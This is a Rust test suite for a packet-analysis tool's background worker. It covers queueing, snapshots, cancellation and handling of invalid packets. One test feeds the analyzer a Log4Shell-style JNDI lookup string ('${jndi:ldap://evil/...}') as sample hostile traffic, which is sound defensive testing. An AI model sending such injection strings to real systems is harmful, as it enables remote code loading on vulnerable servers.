#[path = "support/packets.rs"]
mod packets;
use packrat_tui::analysis::stream::StreamKey;
use packrat_tui::engine::{
    AnalysisCore,
    worker::{AnalysisWorker, SubmitError, WorkerEvent, WorkerLimits},
};
use std::time::{Duration, Instant};

fn next(worker: &AnalysisWorker) -> WorkerEvent {
    let deadline = Instant::now() + Duration::from_secs(3);
    loop {
        if let Some(event) = worker.try_event().unwrap() {
            return event;
        }
        assert!(Instant::now() < deadline, "worker stalled");
        std::thread::yield_now();
    }
}

#[test]
fn worker_owns_core_and_drains_every_accepted_packet_on_finish() {
    let mut worker =
        AnalysisWorker::spawn(AnalysisCore::default(), WorkerLimits::default()).unwrap();
    for no in 1..=100 {
        worker
            .try_packet(packets::tcp(no, 100, 0x18, b"payload"), false)
            .unwrap();
    }
    let monitor = worker.monitor();
    let mut sequences = Vec::new();
    let core = worker
        .finish(|event| {
            if let WorkerEvent::Packet { sequence, .. } = event {
                sequences.push(sequence);
            }
        })
        .unwrap();
    assert_eq!(sequences, (1..=100).collect::<Vec<_>>());
    assert_eq!(
        core.flow_tracker
            .flows
            .values()
            .map(|flow| flow.packets)
            .sum::<u64>(),
        100
    );
    assert_eq!(monitor.latest().analyzed, 100);
    assert!(!monitor.is_running());
}

#[test]
fn queue_pressure_returns_the_original_packet_instead_of_dropping_it() {
    let limits = WorkerLimits {
        input_capacity: 1,
        event_capacity: 1,
        ..Default::default()
    };
    let mut worker = AnalysisWorker::spawn(AnalysisCore::default(), limits).unwrap();
    let mut rejected = false;
    for no in 1..=100 {
        match worker.try_packet(packets::tcp(no, 100, 0x18, b"kept"), false) {
            Ok(_) => (),
            Err(SubmitError::Full(packet)) => {
                assert_eq!(packet.no, no);
                assert!(packet.bytes.ends_with(b"kept"));
                rejected = true;
                break;
            }
            Err(error) => panic!("{error:?}"),
        }
    }
    assert!(rejected);
    worker.finish(|_| ()).unwrap();
}

#[test]
fn inspection_snapshots_remain_immutable_when_worker_advances() {
    let mut worker =
        AnalysisWorker::spawn(AnalysisCore::default(), WorkerLimits::default()).unwrap();
    let packet = packets::tcp(1, 100, 0x18, b"GET /one HTTP/1.1\r\n\r\n");
    let id = StreamKey::from_packet(&packet).unwrap().id();
    worker.try_packet(packet, false).unwrap();
    next(&worker);
    worker.try_inspect(42, id.clone()).unwrap();
    let snapshot = match next(&worker) {
        WorkerEvent::Inspection {
            request_id: 42,
            result: Ok(snapshot),
            ..
        } => snapshot,
        event => panic!("{event:?}"),
    };
    worker
        .try_packet(
            packets::tcp(2, 121, 0x18, b"GET /two HTTP/1.1\r\n\r\n"),
            false,
        )
        .unwrap();
    next(&worker);
    assert_eq!(snapshot.http1.as_ref().unwrap().transactions.len(), 1);
    assert_eq!(snapshot.sequence, 1);
    assert_eq!(
        snapshot
            .stream
            .packet_numbers(true, 0, snapshot.stream.client_data.len()),
        [1]
    );
    worker.finish(|_| ()).unwrap();
}

#[test]
fn offline_mixing_and_clear_have_explicit_generation_boundaries() {
    let mut worker =
        AnalysisWorker::spawn(AnalysisCore::default(), WorkerLimits::default()).unwrap();
    for (no, live) in [(1, true), (2, false), (3, true)] {
        worker
            .try_packet(packets::tcp(no, 100, 0x18, b"x"), live)
            .unwrap();
        let WorkerEvent::Packet {
            live: eligible,
            generation: 0,
            ..
        } = next(&worker)
        else {
            panic!();
        };
        assert_eq!(eligible, no == 1);
    }
    assert_eq!(worker.try_clear().unwrap(), 1);
    worker
        .try_packet(packets::tcp(4, 100, 0x18, b"x"), true)
        .unwrap();
    let WorkerEvent::Packet {
        live: true,
        generation: 1,
        sequence: 4,
        ..
    } = next(&worker)
    else {
        panic!();
    };
    let monitor = worker.monitor();
    worker.finish(|_| ()).unwrap();
    assert_eq!(monitor.latest().generation, 1);
    assert_eq!(monitor.latest().analyzed, 1);
}

#[test]
fn cancellation_does_not_block_on_full_output_queues() {
    let mut worker = AnalysisWorker::spawn(
        AnalysisCore::default(),
        WorkerLimits {
            event_capacity: 1,
            ..Default::default()
        },
    )
    .unwrap();
    for no in 1..=32 {
        worker
            .try_packet(packets::tcp(no, 100, 0x18, b"x"), false)
            .unwrap();
    }
    let monitor = worker.monitor();
    drop(worker);
    let deadline = Instant::now() + Duration::from_secs(3);
    while monitor.is_running() {
        assert!(Instant::now() < deadline);
        std::thread::yield_now();
    }
}

#[test]
fn invalid_limits_are_rejected_before_spawning() {
    assert!(
        AnalysisWorker::spawn(
            AnalysisCore::default(),
            WorkerLimits {
                input_capacity: 0,
                ..Default::default()
            }
        )
        .is_err()
    );
}

#[test]
fn unusable_packets_are_reported_but_never_enter_incident_history() {
    let mut worker =
        AnalysisWorker::spawn(AnalysisCore::default(), WorkerLimits::default()).unwrap();
    let mut invalid = packets::tcp(1, 100, 0x18, b"bad clock");
    invalid.timestamp = f64::NAN;
    worker.try_packet(invalid, false).unwrap();
    worker
        .try_packet(packets::tcp(2, 100, 0x18, b"${jndi:ldap://evil/x}"), false)
        .unwrap();
    let monitor = worker.monitor();
    let core = worker.finish(|_| ()).unwrap();
    assert_eq!(monitor.latest().skipped, 1);
    assert_eq!(monitor.latest().analyzed, 1);
    assert!(
        core.incidents
            .incidents
            .iter()
            .flat_map(|incident| &incident.packet_history)
            .all(|packet| packet.timestamp.is_finite())
    );
}
